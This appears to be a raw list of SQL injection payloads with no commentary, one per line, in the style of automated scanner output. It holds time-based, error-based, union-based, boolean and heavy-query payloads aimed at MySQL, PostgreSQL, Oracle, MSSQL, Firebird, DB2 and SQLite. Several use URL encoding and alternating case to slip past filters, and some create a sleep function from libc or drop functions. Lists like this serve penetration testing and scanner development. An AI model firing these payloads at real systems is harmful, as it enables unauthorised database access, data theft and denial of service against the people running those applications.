+1%')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+1;(select * from (select(sleep(5)))srmq)
+1,extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788 = 9788,1))),0x717a767a71))
+1')%20and%20(select%209067%20from(select%20count(*),concat(0x7171706a71,(select%20(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x%20from%20information_schema%2echaracter_sets%20group%20by%20x)a)%20and%20('wfws'='wfws
+1')%20where%208429=8429;select%20(case%20when%20(3855=3855)%20then%203855%20else%201%2f(select%200)%20end)--
+1%') and 6969 = (select 6969 from pg_sleep(5)) and ('%' = '
+1' Or eXtRaCtVaLuE(1297,cOnCaT(0x5c,0X7171706A71,(sElEcT (eLt(1297=1297,1))),0x717a767a71)) aNd 'UsNh' LiKe 'UsNh
+1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rhli
+1'||(SeLeCt 'CtGs' WhErE 6809=6809 Or 6979=LiKe('AbCdEfG',uPpEr(hEx(rAnDoMbLoB(500000000/2))))--
+1' where 6902=6902 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1%\")) ; select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((\"%\" = \"
+1'+(select%20'dhcv'%20where%209372=9372;begin%20dbms_lock%2esleep(5);%20end)+'
+1')) as hrra where 9533=9533 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1 and 5556 = (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- gynj
+1\")) as tsry where 6594 = 6594 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045 = 1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--
+1 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1'%20in%20boolean%20mode);select%20(case%20when%20(8711=6432)%20then%201%20else%208711*(select%208711%20from%20master%2e%2esysdatabases)%20end)--
+1\")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237 = 6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((\"tbdl\" like \"tbdl
+1\") aS NqTn wHeRe 5606=5606 aNd 9660=(sElEcT CoUnT(*) fRoM AlL_UsErS T1,aLl_uSeRs t2,AlL_UsErS T3,aLl_uSeRs t4,AlL_UsErS T5)--
+-4653'%20or%201%20group%20by%20concat(0x7171706a71,(select%20(case%20when%20(4232=4232)%20then%201%20else%200%20end)),0x717a767a71,floor(rand(0)*2))%20having%20min(0)#
+1\")))%20and%206055=ctxsys%2edrithsx%2esn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select%20(case%20when%20(6055=6055)%20then%201%20else%200%20end)%20from%20dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))%20and%20(((\"fogb\"%20like%20\"fogb
+1) and 7533=7533 and (7175=7175
+1%\") or 8514 = benchmark(5000000,md5(0x544d5a4c))#
+-2233' or (1807 = 7274)*7274
+-5982' or 3440 = cast((chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113)) |  | (select (case when (3440 = 3440) then 1 else 0 end))::text |  | (chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113)) as numeric) and 'ikuh' = 'ikuh
+1) WhErE 6304=6304;SeLeCt lIkE('aBcDeFg',UpPeR(HeX(RaNdOmBlOb(500000000/2))))--
+-1597\"%20union%20all%20select%206038,6038,6038,6038,6038,6038,6038,6038,6038,6038--
+1'||(select%20'zvpl'%20where%205877=5877%20union%20all%20select%20null,null#
+1%'%20or%207552=(select%20count(*)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4)%20and%20'%'='
+1') where 3572=3572;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+1%'))) or (select * from (select(sleep(5)))ydpu) and ((('%'='
+1') uNiOn aLl sElEcT NuLl,nUlL,NuLl,nUlL,NuLl,nUlL--
+(select (case when (1421=1421) then 1 else 1421*(select 1421 from master..sysdatabases) end))
+1%\"))) ; select (case when (2140 = 5325) then 2140 else 2140*(select 2140 from information_schema.character_sets) end)#
+1')));begin user_lock.sleep(5); end and ((('gqhc'='gqhc
+1'))%20or%20char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)%20and%20(('aovy'='aovy
+1' where 4403=4403 rlike sleep(5)#
+1'))) and 8594=(select 8594 from pg_sleep(5))--
+1%')))%20and%207219=7361%20and%20((('%'='
+1%\" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and \"%\"=\"
+1\"))%20and%203707=(select%20count(*)%20from%20sysibm%2esystables%20as%20t1,sysibm%2esystables%20as%20t2,sysibm%2esystables%20as%20t3)%20and%20((\"oyfz\"=\"oyfz
+1%')));select%20case%20when%207717=7717%20then%201%20else%20null%20end--
+1)%20where%209432=9432%20and%206510=(select%20count(*)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7)--
+1%' and 8594=(select 8594 from pg_sleep(5))--
+-1459'))) oR 5903=('qQpJq'||(SeLeCt cAsE 5903 wHeN 5903 tHeN 1 ElSe 0 eNd fRoM RdB$DaTaBaSe)||'QzVzQ') AnD ((('EiEt' LiKe 'EiEt
+1'%20and%206969=(select%206969%20from%20pg_sleep(5))%20and%20'zoin'='zoin
+-5970' WhErE 2769=2769 UnIoN AlL SeLeCt 2769--
+-9854%\"))) Or 6455=3652
+1') and sleep(5) and ('njud'='njud
+1'+(select iowv where 6105=6105 and sleep(5)#
+1'+(select zfpk where 9784 = 9784 or 4411 = (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'
+-3632' or make_set(9354 = 9354,7185) and 'lgpy' like 'lgpy
+1)%20union%20all%20select%20null,null,null,null,null,null,null,null,null#
+-7868\" union all select 1805--
+1')%20or%20elt(5873=5873,sleep(5))#
+1%\") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (\"%\"=\"
+1%'))%20union%20all%20select%20null,null,null,null,null,null,null,null#
+1\" ; select sleep(5)#
+1 where 1656=1656 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')
+1\";select count(*) from generate_series(1,5000000)--
+1\")) as thoj where 1577=1577 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1',RoW(7937,5067)>(SeLeCt cOuNt(*),CoNcAt(0X7171706A71,(sElEcT (eLt(7937=7937,1))),0x717a767a71,fLoOr(rAnD(0)*2))X FrOm (SeLeCt 9974 UnIoN SeLeCt 5497 UnIoN SeLeCt 8209 UnIoN SeLeCt 8147)A GrOuP By x)
+1') oR ElT(6272=6272,SlEeP(5)) AnD ('YzNd' LiKe 'YzNd
+1%20and%20(select%20*%20from%20(select(sleep(5)))gcrr)#
+1,(SeLeCt (CaSe wHeN (1609=1609) ThEn wAiTfOr dElAy '0:0:5' eLsE 1609*(SeLeCt 1609 FrOm mAsTeR..sYsDaTaBaSeS) eNd))
+1') oR 4411=(SeLeCt cOuNt(*) FrOm sYsUsErS As sYs1,SySuSeRs aS SyS2,sYsUsErS As sYs3,SySuSeRs aS SyS4,sYsUsErS As sYs5,SySuSeRs aS SyS6,sYsUsErS As sYs7) aNd ('eDcM' lIkE 'eDcM
+1' AnD 3754=(SeLeCt uPpEr(xMlTyPe(cHr(60)||ChR(58)||cHr(113)||cHr(113)||cHr(112)||cHr(106)||cHr(113)||(SeLeCt (CaSe wHeN (3754=3754) ThEn 1 eLsE 0 EnD) fRoM DuAl)||cHr(113)||cHr(122)||cHr(118)||cHr(122)||cHr(113)||cHr(62))) fRoM DuAl) AnD 'fBzO' lIkE 'fBzO
+1' and elt(1210=1210,sleep(5)) and 'yhpp' like 'yhpp
+1\") where 4964 = 4964 ; (select * from (select(sleep(5)))srmq)--
+1%\");select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+1\" WhErE 9014=9014 AnD 6969=(SeLeCt 6969 FrOm pG_SlEeP(5))--
+1) or 5286 = (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+1\") as bpmk where 6412=6412 union all select null,null,null,null#
+1\")%20where%202758=2758%20union%20all%20select%20null,null,null,null,null,null,null--
+1')));select%20benchmark(5000000,md5(0x4c4d6142))%20and%20((('egnv'%20like%20'egnv
+1'%20or%20exp(~(select%20*%20from%20(select%20concat(0x7171706a71,(select%20(elt(6270=6270,1))),0x717a767a71,0x78))x))%20and%20'zpyx'='zpyx
+1' and 6969 = (select 6969 from pg_sleep(5)) and 'lqsa' like 'lqsa
+1\" UnIoN AlL SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL--
+1;bEgIn dBmS_LoCk.sLeEp(5); eNd--
+1'%20in%20boolean%20mode)%20and%209254=(select%20count(*)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4)--
+1' where 8099=8099;waitfor delay '0:0:5'--
+1 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
+1%\")) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+-6363\")%20where%204043=4043%20union%20all%20select%204043,4043,4043,4043,4043,4043,4043,4043,4043--
+-4764\")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((\"dfvz\" like \"dfvz
+1%' order by 1--
+1\")) or 7427 = dbms_pipe.receive_message(chr(116) |  | chr(87) |  | chr(90) |  | chr(109),5)--
+1') aS NmZp wHeRe 3794=3794 aNd 6510=(sElEcT CoUnT(*) fRoM SySuSeRs aS SyS1,sYsUsErS As sYs2,SySuSeRs aS SyS3,sYsUsErS As sYs4,SySuSeRs aS SyS5,sYsUsErS As sYs6,SySuSeRs aS SyS7)--
+-5082)) uNiOn aLl sElEcT 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#
+-2790')) or 8571 = 8571--
+1)) aS RsNb wHeRe 3168=3168 pRoCeDuRe aNaLySe(eXtRaCtVaLuE(9627,cOnCaT(0x5c,(BeNcHmArK(5000000,Md5(0x4b774c75))))),1)#
+-1134%20union%20all%20select%201297,1297,1297,1297,1297,1297,1297,1297,1297--
+1\"))%20as%20bovm%20where%205560=5560%20union%20all%20select%20null,null,null,null,null,null,null#
+-4670\")) or 3038=3038
+1')));bEgIn uSeR_LoCk.sLeEp(5); eNd aNd ((('hGlQ' lIkE 'hGlQ
+1\")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((\"gxqq\"=\"gxqq
+1) As eWnV WhErE 3393=3393 AnD 2716=(SeLeCt cOuNt(*) FrOm sYsUsErS As sYs1,SySuSeRs aS SyS2,sYsUsErS As sYs3,SySuSeRs aS SyS4,sYsUsErS As sYs5,SySuSeRs aS SyS6,sYsUsErS As sYs7)--
+1%\")))%20and%209254=(select%20count(*)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4)--
+-7466 where 5161 = 5161 or 3038 = 3038
+1%20where%202239=2239%20and%206969=(select%206969%20from%20pg_sleep(5))--
+1');sElEcT (cAsE WhEn (6276=6276) tHeN 6276 eLsE 6276*(SeLeCt 6276 FrOm iNfOrMaTiOn_sChEmA.ChArAcTeR_SeTs) EnD)#
+1 or 8421 = (select count(*) from generate_series(1,5000000))# jmki
+1%' oR 2367=(SeLeCt cOuNt(*) FrOm rDb$fIeLdS As t1,RdB$TyPeS As t2,RdB$CoLlAtIoNs aS T3,rDb$fUnCtIoNs aS T4)--
+-3834')) as hhiy where 2086 = 2086 or 3038 = 3038
+1%\")%20or%20char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1\") wHeRe 1416=1416 uNiOn aLl sElEcT NuLl,nUlL,NuLl#
+1\" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and \"rdri\"=\"rdri
+1') as ljpy where 8270=8270 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
+1\" rlike (select (case when (5552=1712) then 1 else 0x28 end))
+1\" where 2483 = 2483 ; select (case when (6276 = 6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
+1'%20in%20boolean%20mode)%20or%20elt(6272=6272,sleep(5))#
+1%\"))%20and%20char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1\")) as brwj where 9180 = 9180 ; select (case when (4666 = 4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+1\");cAlL ReGeXp_sUbStRiNg(rEpEaT(RiGhT(ChAr(2385),0),500000000),nUlL)--
+1') aS PfWt wHeRe 8448=8448 uNiOn aLl sElEcT NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl#
+1%\"))) ; select (case when (5290 = 1720) then 5290 else 1 / (select 0) end)--
+1\") wHeRe 9861=9861;cReAtE Or rEpLaCe fUnCtIoN SlEeP(InT) rEtUrNs iNt aS '/LiB/LiBc.sO.6','SlEeP' lAnGuAgE 'c' StRiCt; SeLeCt sLeEp(5)--
+1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113 = 8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz
+1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393 = 3393,1))),0x717a767a71),1161)
+-6746\") oR (8459=8459)*4906 aNd (\"kOhI\" lIkE \"kOhI
+1) WhErE 9645=9645 UnIoN AlL SeLeCt nUlL,NuLl,nUlL--
+1%\"))) union all select null,null,null,null,null,null,null,null,null#
+1) as zmjm where 9125=9125 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--
+-1891' in boolean mode) union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+1\") aNd 8514=(sElEcT CoUnT(*) fRoM DoMaIn.dOmAiNs aS T1,dOmAiN.CoLuMnS As t2,DoMaIn.tAbLeS As t3) aNd (\"fPqH\"=\"FpQh
+1\") where 9827 = 9827 ; call regexp_substring(repeat(left(crypt_key(char(65) |  | char(69) |  | char(83),null),0),500000000),null)--
+-9588'))%20union%20all%20select%207280,7280,7280,7280,7280,7280,7280,7280,7280,7280--
+1')%20or%202367=(select%20count(*)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4)--
+1')) As vDhW WhErE 8858=8858 OrDeR By 1#
+1%\") PrOcEdUrE AnAlYsE(ExTrAcTvAlUe(9255,CoNcAt(0X5C,(bEnChMaRk(5000000,mD5(0X52515A50))))),1) AnD (\"%\"=\"
+1') wHeRe 7322=7322 aNd 5556=(sElEcT CoUnT(*) fRoM AlL_UsErS T1,aLl_uSeRs t2,AlL_UsErS T3,aLl_uSeRs t4,AlL_UsErS T5)--
+1\") as ifgl where 2190=2190 rlike (select (case when (7689=7689) then 1 else 0x28 end))--
+1',(select%20(case%20when%20(5586=6403)%20then%201%20else%205586*(select%205586%20from%20mysql%2edb)%20end))
+1 where 6827 = 6827 ; select case when 7717 = 7717 then 1 else null end--
+1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'='vhvh
+1') where 2974 = 2974 and 4386 = utl_inaddr.get_host_address(chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113) |  | (select (case when (4386 = 4386) then 1 else 0 end) from dual) |  | chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113))--
+1\")))%20and%20extractvalue(7982,concat(0x5c,0x7171706a71,(select%20(elt(7982=7982,1))),0x717a767a71))%20and%20(((\"yopd\"%20like%20\"yopd
+1\") where 2680 = 2680 or elt(5873 = 5873,sleep(5))#
+-9864\") or elt(5885 = 4936,4936) and (\"bfbb\" like \"bfbb
+-5336')%20where%208691=8691%20or%203608=1887--
+1))%20or%20sleep(5)%20and%20((8285=8285
+1'%20or%204240=(select%204240%20from%20pg_sleep(5))--
+1\" AnD ExP(~(SeLeCt * fRoM (sElEcT CoNcAt(0X7171706A71,(sElEcT (eLt(8190=8190,1))),0x717a767a71,0X78))x)) aNd \"QzZg\" LiKe \"QzZg
+1') uNiOn aLl sElEcT NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl#
+1)%20and%206510=(select%20count(*)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7)
+1',(case%20when%205204=2136%20then%201%20else%20null%20end)
+-5800\") or 6872 = 6872 and (\"tcab\" like \"tcab
+-9336' or 5641=9488#
+1'%20where%203028=3028;select%20count(*)%20from%20domain%2edomains%20as%20t1,domain%2ecolumns%20as%20t2,domain%2etables%20as%20t3--
+-9751\")))%20or%205929=3884--
+1'));begin user_lock.sleep(5); end--
+1%')));SeLeCt sLeEp(5)#
+1\" UnIoN AlL SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL--
+1'||(select%20'czos'%20from%20dual%20where%206814=6814;select%20*%20from%20generate_series(6414,6414,case%20when%20(6414=6455)%20then%201%20else%200%20end)%20limit%201--
+1') as jrwx where 6087=6087 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--
+-7083\"%20or%205023=ctxsys%2edrithsx%2esn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select%20(case%20when%20(5023=5023)%20then%201%20else%200%20end)%20from%20dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))%20and%20\"ajcl\"%20like%20\"ajcl
+1'+(select lhho where 7579=7579 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+-8106%\") UnIoN AlL SeLeCt 2051,2051,2051,2051,2051,2051#
+-4557 or 6872 = 6872-- kkte
+1'+(sElEcT 'sUzS' wHeRe 2905=2905 aNd 4241=CoNvErT(InT,(sElEcT ChAr(113)+ChAr(113)+ChAr(112)+ChAr(106)+ChAr(113)+(sElEcT (cAsE WhEn (4241=4241) tHeN ChAr(49) eLsE ChAr(48) eNd))+cHaR(113)+cHaR(122)+cHaR(118)+cHaR(122)+cHaR(113))))+'
+1\" where 3678 = 3678 and 6537 = dbms_pipe.receive_message(chr(76) |  | chr(116) |  | chr(117) |  | chr(65),5)--
+-4346') or 1 group by concat(0x7171706a71,(select (case when (4232 = 4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1'||(SeLeCt 'FqOz' WhErE 9794=9794 UnIoN AlL SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL--
+1\") where 4520=4520;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+1%20where%205700=5700;select%20pg_sleep(5)--
+1\")) AnD 6055=cTxSyS.DrItHsX.Sn(6055,(cHr(113)||cHr(113)||cHr(112)||cHr(106)||cHr(113)||(SeLeCt (CaSe wHeN (6055=6055) ThEn 1 eLsE 0 EnD) fRoM DuAl)||cHr(113)||cHr(122)||cHr(118)||cHr(122)||cHr(113))) AnD ((\"zPtU\"=\"ZpTu
+1%')) and 6537 = dbms_pipe.receive_message(chr(76) |  | chr(116) |  | chr(117) |  | chr(65),5) and (('%' = '
+1%20or%204411=(select%20count(*)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7)--%20ctdx
+1'))%20as%20jxvv%20where%206593=6593%20or%20elt(6272=6272,sleep(5))--
+1\"))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((\"wwaq\"=\"wwaq
+1\")) As uXnC WhErE 8041=8041 AnD 9198=9198--
+1'||(select 'hdpi' where 5620=5620 and make_set(8403=8403,8899))||'
+-1823%20where%206852=6852%20union%20all%20select%206852,6852,6852,6852,6852,6852#
+1') and 1987 = 3756#
+1\"));begin user_lock.sleep(5); end--
+1 and 6510 = (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ixlk
+1\") as eefe where 5290 = 5290 and (select * from (select(sleep(5)))gcrr)#
+1%') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173 = 9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('%' = '
+1')%20as%20asjj%20where%201721=1721%20union%20all%20select%20null,null,null,null,null,null--
+1'%20and%206240=('qqpjq'||(select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb$database)||'qzvzq')%20and%20'sqvt'%20like%20'sqvt
+1%') and char(109) |  | char(79) |  | char(70) |  | char(90) = regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1' |  | (select 'tisi' from dual where 1616 = 1616 and 2853 = cast((chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113)) |  | (select (case when (2853 = 2853) then 1 else 0 end))::text |  | (chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113)) as numeric)) |  | '
+1' where 3700=3700 union all select null,null,null--
+1%' ; select count(*) from generate_series(1,5000000)--
+1' In bOoLeAn mOdE);sElEcT * FrOm gEnErAtE_SeRiEs(1431,1431,cAsE WhEn (1431=7822) tHeN 1 ElSe 0 eNd) LiMiT 1--
+1')%20where%207322=7322%20and%205556=(select%20count(*)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5)--
+1'%20in%20boolean%20mode);select%20(case%20when%20(1812=2446)%20then%201812%20else%20cast(1%20as%20int)%2f(select%200%20from%20dual)%20end)%20from%20dual--
+-1407 where 1186 = 1186 union all select 1186,1186,1186,1186,1186--
+1'));If(7899=7899) SeLeCt 7899 ElSe dRoP FuNcTiOn zBbP--
+-1413\") union all select 6651,6651,6651--
+1%\"));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+-6076\"))%20or%208277=4757
+1) where 6082 = 6082 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067 = 9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
+1\")) as etap where 8506 = 8506 union all select null,null,null,null#
+-6433%')) oR 9323=9323#
+1') aNd 2577=7094
+1' in boolean mode) or 8384 = like('abcdefg',upper(hex(randomblob(500000000 / 2))))#
+1' in boolean mode);select pg_sleep(5)#
+1%\") and 7756 = dbms_utility.sqlid_to_sqlhash((chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113) |  | (select (case when (7756 = 7756) then 1 else 0 end) from dual) |  | chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113))) and (\"%\" = \"
+1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('kkgt'='kkgt
+1%') ; call regexp_substring(repeat(left(crypt_key(char(65) |  | char(69) |  | char(83),null),0),500000000),null) and ('%' = '
+-4135\") as leiz where 3582 = 3582 or 4144 = (select upper(xmltype(chr(60) |  | chr(58) |  | chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113) |  | (select (case when (4144 = 4144) then 1 else 0 end) from dual) |  | chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113) |  | chr(62))) from dual)--
+1\")) PrOcEdUrE AnAlYsE(ExTrAcTvAlUe(5840,CoNcAt(0X5C,0x7171706a71,(SeLeCt (CaSe wHeN (5840=5840) ThEn 1 eLsE 0 EnD)),0x717a767a71)),1) AnD ((\"rTyU\" lIkE \"rTyU
+1') as hlbq where 2347=2347 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1\") where 6138=6138 and 8594=(select 8594 from pg_sleep(5))--
+1);select%20case%20when%207951=1147%20then%201%20else%20null%20end--
+1\"))) and 6240 = ('qqpjq' |  | (select case 6240 when 6240 then 1 else 0 end from rdb$database) |  | 'qzvzq') and (((\"umne\" like \"umne
+-5528') uNiOn aLl sElEcT 5153,5153,5153,5153,5153,5153,5153,5153,5153#
+-9947\")))%20union%20all%20select%208765,8765,8765,8765,8765#
+1')) AnD 8635=(SeLeCt cOuNt(*) FrOm gEnErAtE_SeRiEs(1,5000000))--
+1) as bozx where 2160 = 2160 and sleep(5)#
+-3431%')%20or%209323=9323#
+1')))%20or%204411=(select%20count(*)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7)%20and%20((('narn'='narn
+1 rLiKe (SeLeCt * fRoM (sElEcT(SlEeP(5)))SgVo)# eWsZ
+1'))%20as%20lkse%20where%209951=9951;create%20or%20replace%20function%20sleep(int)%20returns%20int%20as%20'%2flib%2flibc%2eso%2e6','sleep'%20language%20'c'%20strict;%20select%20sleep(5)--
+1)%20where%207748=7748%20and%209254=(select%20count(*)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4)--
+1\" and elt(1210 = 1210,sleep(5)) and \"zhxm\" = \"zhxm
+-7568\"))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((\"jxge\" like \"jxge
+1)%20as%20tjwa%20where%201173=1173%20or%20extractvalue(1297,concat(0x5c,0x7171706a71,(select%20(elt(1297=1297,1))),0x717a767a71))--
+-2679'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cutk' like 'cutk
+1) where 6090=6090;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
+1%\")) ; select (case when (9393 = 5530) then 9393 else cast(1 as int) / (select 0 from dual) end) from dual--
+1%\") Or 4240=(sElEcT 4240 fRoM Pg_sLeEp(5))--
+1 where 9752 = 9752 ; create or replace function sleep(int) returns int as ' / lib / libc.so.6','sleep' language 'c' strict ;  select sleep(5)--
+1')));sElEcT DbMs_pIpE.ReCeIvE_MeSsAgE(ChR(66)||cHr(67)||ChR(79)||cHr(101),5) fRoM DuAl aNd ((('xMwJ'='XmWj
+1')));sElEcT (cAsE WhEn (1291=6612) tHeN 1 ElSe 1291*(sElEcT 1291 fRoM MaStEr..SySdAtAbAsEs) EnD)--
+1%\") and 3824 = benchmark(5000000,md5(0x76555642)) and (\"%\" = \"
+-1765') oRdEr bY 1--
+1'+(select 'ndpx' where 4061 = 4061 or 7417 = (select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+1 union all select null,null,null,null,null#
+1\"))) oR 1022=(SeLeCt cOuNt(*) FrOm aLl_uSeRs t1,AlL_UsErS T2,aLl_uSeRs t3,AlL_UsErS T4,aLl_uSeRs t5)--
+1)) aS OgCv wHeRe 4396=4396;iF(7899=7899) sElEcT 7899 eLsE DrOp fUnCtIoN ZbBp--
+1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('pbqg'='pbqg
+-4055'))%20as%20yoez%20where%203816=3816%20or%20(8459=8459)*4906--
+1\" WhErE 8016=8016;SeLeCt cOuNt(*) FrOm gEnErAtE_SeRiEs(1,5000000)--
+1\" and 6969=(select 6969 from pg_sleep(5))
+1) where 2223=2223;(select * from (select(sleep(5)))acdk)#
